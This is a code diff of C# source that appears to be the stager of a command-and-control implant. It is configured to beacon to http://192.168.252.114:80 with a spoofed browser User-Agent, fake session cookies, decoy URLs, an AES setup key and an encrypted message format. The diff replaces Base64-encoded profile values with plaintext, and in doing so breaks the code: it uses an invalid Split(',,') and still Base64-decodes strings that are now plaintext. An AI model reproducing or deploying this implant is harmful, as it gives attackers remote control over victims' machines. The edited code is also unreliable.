@@ -29,11 +29,11 @@ namespace testingObject
         {
             try
             {
-                List<string> myURIs = @"http://192.168.252.114:80".Split(',').ToList();
+                List<string> myURIs = new List<string> { "http://192.168.252.114:80" };
                 string CertHash = @"";
-				List<string> ProfileHttpHeaderNames = @"VXNlci1BZ2VudA==,Q29va2llcw==".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-				List<string> ProfileHttpHeaderValues = @"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-				List<string> ProfileHttpUrls = @"L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+				List<string> ProfileHttpHeaderNames = @"User-Agent,Cookies".Split(',').ToList();
+				List<string> ProfileHttpHeaderValues = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36,,ASPSESSIONID={GUID}; SESSIONID=1552332971750".Split(',,').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+				List<string> ProfileHttpUrls = @"/en-us/index.html,/en-us/docs.html,/en-us/test.html".Split(',').ToList();
 				string ProfileHttpPostRequest = @"i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
                 string ProfileHttpPostResponse = @"<html>
     <head>
@@ -50,7 +50,7 @@ namespace testingObject
                 Random random = new Random();
                 string aGUID = @"ccfc3b4986";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
-                byte[] SetupKeyBytes = Convert.FromBase64String(@"AHHGYhY9fzjo2TnFFx/quinMuPAmFBa1awFHSQNNwDA=");
+                byte[] SetupKeyBytes = Convert.FromBase64String(@"AHHGYhY9fzjo2TnFFx/quinMuPAmFBa1awFHSQNNwDA="); //Left out due to errors
                 string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
 
                 Aes SetupAESKey = Aes.Create();
